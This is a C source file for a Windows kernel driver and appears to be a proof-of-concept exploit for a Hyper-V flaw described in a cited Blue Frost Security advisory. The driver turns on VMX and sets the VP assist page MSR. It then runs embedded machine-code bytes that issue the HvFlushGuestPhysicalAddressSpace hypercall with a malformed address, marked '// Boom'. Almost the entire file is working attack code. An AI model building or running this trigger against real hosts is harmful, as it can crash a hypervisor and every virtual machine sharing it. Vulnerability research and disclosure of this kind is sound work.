// Advisory: https://labs.bluefrostsecurity.de/advisories/bfs-sa-2020-003/

#include <intrin.h>
#include <intrin.h>
#include <ntddk.h>
#include <wdf.h>
#include <initguid.h>
 
EXTERN_C_START
DRIVER_INITIALIZE DriverEntry;
EXTERN_C_END
 
#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#endif
 
#pragma code_seg(push, r1, ".text")
__declspec(allocate(".text")) BYTE trigger[] =
{
    0x48, 0x89, 0xC8,             //  mov rax, rcx               hypercall page
    0xB9, 0xAF, 0x00, 0x01, 0x00, //  mov ecx, 0x100af
    0x48, 0xBA, 0xFF, 0xFF, 0xFF, //           HvFlushGuestPhysicalAddressSpace
    0xFF, 0xFF, 0xFF, 0xFF, 0x7F, //  mov rdx,0x7fffffffffffffff            GPA
    0x4D, 0x31, 0xC0,             //  xor r8,r8                           flags
    0xFF, 0xD0                    //  call rax
};
#pragma code_seg(pop, r1)
 
typedef void(* TriggerCall)(void *hc_page);
 
typedef union hv_x64_msr_contents
{
    UINT64 as_uint64;
    struct
    {
        UINT64 enable : 1;
        UINT64 reserved : 11;
        UINT64 guest_physical_address : 52;
    } u;
} hv_msr_contents;
 
#define HV_X64_MSR_GUEST_OS_ID              0x40000000
#define HV_X64_MSR_HYPERCALL                0x40000001
#define HV_X64_MSR_VP_ASSIST_PAGE                0x40000073
#define CR4_VMXE (1 << 13)
#define CPUID_FEAT_ECX_VMX (1 << 5)
#define MSR_IA32_VMX_BASIC 0x480
 
__declspec(align(0x1000)) UINT32 vmxon_page[1024];
__declspec(align(0x1000)) UINT32 assist_page[1024];
 
 
NTSTATUS enable_vmxe(void)
{
    int cpuInfo[4];
    NTSTATUS status = STATUS_NOT_IMPLEMENTED;
 
    __cpuid(cpuInfo, 1);
 
    if (cpuInfo[2] & CPUID_FEAT_ECX_VMX)
    {
        UINT64 cr4 = __readcr4();
        UINT64 pvmxon_page = MmGetPhysicalAddress(&vmxon_page).QuadPart;
 
        KdPrint(("[+] Virtualization support detected"));
 
        if (!(cr4 & CR4_VMXE))
        {
            KdPrint(("[+] Enabling VMXE..."));
            __writecr4(cr4 | CR4_VMXE);
        }
 
        memset(vmxon_page, 0, sizeof(vmxon_page));
        vmxon_page[0] = (UINT32) __readmsr(MSR_IA32_VMX_BASIC);
        KdPrint(("[+] VMX revision %x", vmxon_page[0]));
        KdPrint(("[+] Entering monitor mode..."));
 
        if (__vmx_on(&pvmxon_page))
            KdPrint(("[-] VMXON failed"));
        else
            status = STATUS_SUCCESS;
    }
 
    return status;
}
 
 
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    )
{
    void* hypercall_page;
    hv_msr_contents hc_page, assist;
    PHYSICAL_ADDRESS pa_hcpage;
    NTSTATUS status = enable_vmxe();
 
    if (!NT_SUCCESS(status))
        return status;
 
    hc_page.as_uint64 = __readmsr(HV_X64_MSR_HYPERCALL);
    pa_hcpage.QuadPart = hc_page.u.guest_physical_address << PAGE_SHIFT;
    hypercall_page = MmMapIoSpace(pa_hcpage, PAGE_SIZE, MmNonCached);
    memset(&assist_page, 0, sizeof(assist_page));
    assist.as_uint64 = MmGetPhysicalAddress(&assist_page).QuadPart;
    assist.u.enable = 1;
    __writemsr(HV_X64_MSR_VP_ASSIST_PAGE, assist.as_uint64);
    ((TriggerCall)trigger)(hypercall_page); // Boom
    return status;
}

